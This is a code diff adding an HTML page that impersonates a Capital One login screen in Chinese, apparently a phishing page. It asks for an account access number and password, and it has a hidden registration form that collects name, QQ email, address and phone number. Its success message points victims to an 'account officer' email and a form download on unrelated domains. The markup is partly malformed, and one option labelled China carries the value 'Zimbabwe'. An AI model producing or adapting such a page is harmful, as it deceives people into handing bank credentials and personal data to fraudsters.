@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<div class="logo">
+    <img src="assets/img/capitalone.png" alt="logo">
+    </div><div class="box">
+    <div class="content">
+    <form class="form-vertical login-form" action="" method="post" novalidate="novalidate">
+    <h3 class="form-title" style="color:#032750"> <i class="icon-lock"></i> 登录账户 - 资本一</h3>
+    <div class="alert fade in erroclass alert-danger" style="display: none;">
+    <i class="icon-remove close" data-dismiss="alert"></i> 输入访问号码和密码. </div>
+    <div class="form-group"> <div class="input-icon"> <i class="icon-user"></i>
+    <input type="tel" maxlength="15" name="account_number" class="form-control account_number" placeholder="10 位访问号码" autofocus="autofocus" data-rule-required="true" data-msg-required="请输入您的访问号码。">
+    </div>
+    <div class="form-group"> <div class="input-icon"> <i class="icon-lock"></i>
+
+     <input type="password" autocomplete="off" name="password" class="form-control password" placeholder="密码" data-rule-required="true" data-msg-required="请输入您的密码。">
+     </div>
+     </div>
+     <div class="form-actions">
+     <label class="checkbox pull-left"><div class="checker"><span class="checked"><input type="checkbox" checked="" class="uniform" name="remember"></span></div> 记住账号</label>
+     <button type="submit" class="submit btn btn-primary pull-right"> 登录 <i class="icon-angle-right"></i> </button>       </div>
+     </form>
+
+     <form class="form-vertical register-form" action="#" method="post" style="display: none;" novalidate="novalidate">
+        <h3 class="form-title">开设免费储蓄账户</h3> 
+        <div class="alert fade in erroclass alert-success" style="display: none ;">
+        <i class="icon-remove close" data-dismiss="alert"></i><b>成功!</b> J只剩下几步了。 通过以下方式联系您的客户经理 account-officer@citizentruistholdings.com for more info. or <a style="text-decoration: underline;" href="admin.standardmidwest.com/account-opening-form.php">下载开户</a>表格，填写字段并提交到上面的电子邮件地址。</div>
+        <div class="form-group">
+        <div class="input-icon">
+        <i class="icon-user"></i>
+        <input type="text" name="fullname" class="form-control name" placeholder="全名" autofocus="autofocus" data-rule-required="true">
+        </div>
+        </div>
+        <div class="form-group">
+        <div class="input-icon">
+        <i class="icon-envelope"></i>
+        <input type="text" name="email" class="form-control email" placeholder="活跃的QQ邮箱地址" autofocus="autofocus" data-rule-required="true">
+        </div>
+        </div>
+        <div class="form-group">
+        <div class="input-icon">
+        <textarea class="form-control address" name="address" placeholder="住址"></textarea>
+        </div>
+        </div>
+        <div class="form-group">
+        <div class="input-icon">
+        <select class="form-control" name="country" id="country" style="height:40px;background:#f7f7f7;border-radius:4px">
+        <option value="">----选择国家----
+        </option><option value="Zimbabwe">中国</option>
+         </select>
+        </div>
+        </div>
+        <div class="form-group">
+        <div class="input-icon">
+        <i class="icon-phone-sign"></i>
+        <input type="text" name="telephone" class="form-control telephone" placeholder="电话" autofocus="autofocus" data-rule-required="true">
+        </div>
+        </div>
+        <div class="form-actions">
+        <button type="button" class="back btn btn-default pull-left"> <i class="icon-angle-left"></i> 后退 </button>
+        
+        </div>
+        </form>
+        </div>
+        <div class="inner-box">
+        <div class="content"> <i class="icon-remove close hide-default"></i>
+        <a href="login.html#" class="forgot-password-link">忘记密码?</a>
+        <form class="form-vertical forgot-password-form hide-default" action="login.html" method="post" novalidate="novalidate">
+        <div class="form-group">
+        <div class="input-icon"> <i class="icon-envelope"></i>
+        <input type="text" name="email" class="form-control" placeholder="输入电邮地址" data-rule-required="true" data-rule-email="true" data-msg-required="请输入您的电子邮件.">
+        </div>
+        </div>
+        <button type="submit" class="submit btn btn-default btn-block"> 重置您的密码 </button>
+        </form>
+        <div class="forgot-password-done hide-default">
+        <i class="icon-ok success-icon"></i>
+        <span>伟大的。 我们已向您发送电子邮件。</span>
+        </div>
+        </div>
+        </div>
+        </div>
+        
+        <div class="inner-box " style="margin:0 auto;width:50%;margin-top:20px">
+        <p href="login.html#" class="sign-up" style="text-align:center;font-size:12px;color:#032750">还没有账号？<br> <strong><a href="#">创建账户</a></strong></p>
+        <hr>
+        </div>
+        
+        <iframe id="tidio-chat-code" title="Tidio Chat code" style="display: none;"></iframe><div id="tidio-chat"><iframe title="Tidio Chat" id="tidio-chat-iframe" style="display: block; border: none; position: fixed; inset: auto 9px 35px auto; width: 94px; height: 94px; opacity: 1; background: none transparent !important; margin: 0px; max-height: 100vh; max-width: 100vw; transform: translateY(0px); transition: none 0s ease 0s !important; visibility: visible; z-index: 999999999 !important; border-radius: 47px 30px 47px 47px;"></iframe></div></body><initial-scale=1.0">
+        <title>Document</title>
+      </head>
+</head>
+      
+<body>
+
+</body>
+</html>
